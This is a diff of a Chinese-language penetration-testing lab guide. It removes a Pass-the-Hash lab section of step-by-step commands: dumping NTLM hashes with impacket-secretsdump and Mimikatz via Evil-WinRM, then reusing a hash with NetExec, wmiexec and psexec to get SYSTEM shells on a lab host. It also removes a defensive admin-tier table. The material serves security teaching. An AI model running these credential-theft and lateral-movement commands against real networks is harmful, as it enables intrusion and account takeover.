@@ -1205,69 +1205,7 @@ proxychains nxc smb 127.0.0.1 -u /tmp/users.txt -p /tmp/passwords.txt
 
 ---
 
-### 实验8：Pass-the-Hash 横向移动
 
-> ⚠️ **前置条件**：已通过实验7获取 Win11 实验主机的管理员凭据（`administrator:P@ssw0rd`）。
->
-> **攻击链位置**：弱口令破解 → 明文密码 → **获取哈希** → **PtH 横向移动**（本实验）
-
-**工具安装**（在验证环境中执行）：
-
-```bash
-sudo apt update
-sudo apt install -y impacket-scripts python3-impacket netexec hydra
-which impacket-secretsdump impacket-wmiexec impacket-psexec nxc hydra
-```
-
-**第一步：获取 NTLM 哈希**
-
-拿到明文密码后，下一步是获取 NTLM 哈希。有两种方法：
-
-```bash
-# 方法一：通过 secretsdump 远程导出（推荐，最简单）
-# 通过 SOCKS5 代理连接 Win11 实验主机，导出所有本地用户的哈希
-proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
-
-# 预期输出（关键部分）：
-# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH值>:::
-#                  ↑ LM Hash（通常为空）                ↑ NTLM Hash（这就是我们需要的）
-
-# 方法二：通过 Evil-WinRM + Mimikatz（交互式，更直观）
-# Evil-WinRM 通过 SOCKS5 代理连接 Win11 实验主机的 WinRM 服务
-proxychains evil-winrm -i 127.0.0.1 -u administrator -p 'P@ssw0rd'
-
-# 在 Evil-WinRM 会话中执行 Mimikatz
-Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
-# 或上传 mimikatz 本地执行
-upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
-.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
-```
-
-> 💡 **记录 NTLM 哈希**：将输出中的 NTLM 哈希值保存好，后续步骤会用到。格式类似：`e0f2b4b11bcf22d4c7d0c4c4e8a4b3f1`
-
-**第二步：使用哈希进行 PtH 攻击**
-
-有了 NTLM 哈希，即使不知道密码也能登录目标机器：
-
-```bash
-# 方法一：NetExec 快速验证哈希（最快，一行命令，通过 SOCKS5 代理）
-proxychains nxc smb 127.0.0.1 -u administrator -H '<NTLM_HASH>'
-# 预期：显示 [+] administrator:<HASH> (Pwn3d!) → 哈希有效
-
-# 方法二：NetExec 远程执行命令（验证 + 执行一步到位）
-proxychains nxc smb 127.0.0.1 -u administrator -H '<NTLM_HASH>' -x "whoami"
-# 预期：显示命令执行结果 NT AUTHORITY\SYSTEM
-
-# 方法三：Impacket wmiexec（交互式 Shell，无文件落地）
-proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
-# 预期：获得 Win11 实验主机的命令行 Shell
-
-# 方法四：Impacket psexec（SYSTEM 权限 Shell）
-proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
-# 预期：获得 NT AUTHORITY\SYSTEM 的最高权限 Shell
-```
-
-> 💡 **PtH 的关键理解**：整个过程中我们**从未输入过密码**——只用了哈希。所有操作都通过 SOCKS5 代理完成，攻击机无需直接访问目标网络。这就是为什么 NTLM 哈希在安全领域被视为"等价于密码"的敏感凭据。防御措施见任务五。
 
 ---
 
@@ -1334,15 +1272,7 @@ proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 └── 快速隔离与恢复
 ```
 
-### Tier 管理模型
 
-| 层级 | 范围 | 管理账户 | 隔离规则 |
-| --- | --- | --- | --- |
-| **Tier 0** | 域控、AD DS | Enterprise/Domain Admins | 禁止登录 Tier 1/2 设备 |
-| **Tier 1** | 成员服务器 | Server Admins | 禁止登录 Tier 2 设备 |
-| **Tier 2** | 工作站 | Workstation Admins | 可登录普通工作站 |
-
-> 💡 **核心原则**：高权限账户只能在高安全级别的设备上使用——防止域管在普通工作站上被窃取凭据。
 
 ---
 
